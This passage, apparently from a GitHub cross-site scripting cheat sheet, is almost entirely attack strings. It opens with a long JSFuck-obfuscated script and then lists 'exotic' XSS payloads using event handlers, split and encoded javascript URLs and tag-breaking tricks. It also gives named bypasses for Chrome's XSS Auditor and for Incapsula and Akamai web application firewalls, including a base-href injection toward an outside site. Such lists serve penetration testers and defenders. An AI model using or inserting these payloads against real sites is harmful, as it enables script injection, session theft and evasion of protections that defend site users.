+<script>(+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]]]+[+[]]+([][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!+[]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!+[]+[])[+[]]+(!+[]+[])[!+[]+!+[]+!+[]]+(!+[]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]])()</script>
+Exotic payloads
+
+<svg/onload=location=`javas`+`cript:ale`+`rt%2`+`81%2`+`9`;//
+<img src=1 alt=al lang=ert onerror=top[alt+lang](0)>
+<script>$=1,alert($)</script>
+<script ~~~>confirm(1)</script ~~~>
+<script>$=1,\u0061lert($)</script>
+<</script/script><script>eval('\\u'+'0061'+'lert(1)')//</script>
+<</script/script><script ~~~>\u0061lert(1)</script ~~~>
+</style></scRipt><scRipt>alert(1)</scRipt>
+<img/id="alert&lpar;&#x27;XSS&#x27;&#x29;\"/alt=\"/\"src=\"/\"onerror=eval(id&#x29;>
+<img src=x:prompt(eval(alt)) onerror=eval(src) alt=String.fromCharCode(88,83,83)>
+<svg><x><script>alert&#40;&#39;1&#39;&#41</x>
+<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>
+Common WAF Bypass
+Chrome Auditor - 9th august
+</script><svg><script>alert(1)-%26apos%3B
+Live example by @brutelogic - https://brutelogic.com.br/xss.php
+
+Incapsula WAF Bypass - 8th march
+anythinglr00</script><script>alert(document.domain)</script>uxldz
+
+anythinglr00%3c%2fscript%3e%3cscript%3ealert(document.domain)%3c%2fscript%3euxldz
+Akamai WAF bypass by @zseano - 18th june
+?"></script><base%20c%3D=href%3Dhttps:\mysite>
+More fun
+This section will be used for the "fun/interesting/useless" stuff.
+
+Use notification box instead of an alert - by @brutelogic Note : it requires user permission
+
+Notification.requestPermission(x=>{new(Notification)(1)})
+Try here : https://brutelogic.com.br/xss.php
+
+Thanks to
+Unleashing-an-Ultimate-XSS-Polyglot
+tbm
+(Relative Path Overwrite) RPO XSS - Infinite Security
+RPO TheSpanner
+RPO Gadget - innerthmtl
+Relative Path Overwrite - Detectify
+XSS ghettoBypass - d3adend
+XSS without HTML: Client-Side Template Injection with AngularJS
+XSSING WEB PART - 2 - Rakesh Mane
+Making an XSS triggered by CSP bypass on Twitter. @tbmnull
+Ways to alert(document.domain) - @tomnomnom
+© 2018 GitHub, Inc.
+Terms
+Privacy
+Security
+Status
+Help
+Contact GitHub
+Pricing
+API
+Training
+Blog
+About
+Press h to open a hovercard with more details.
+
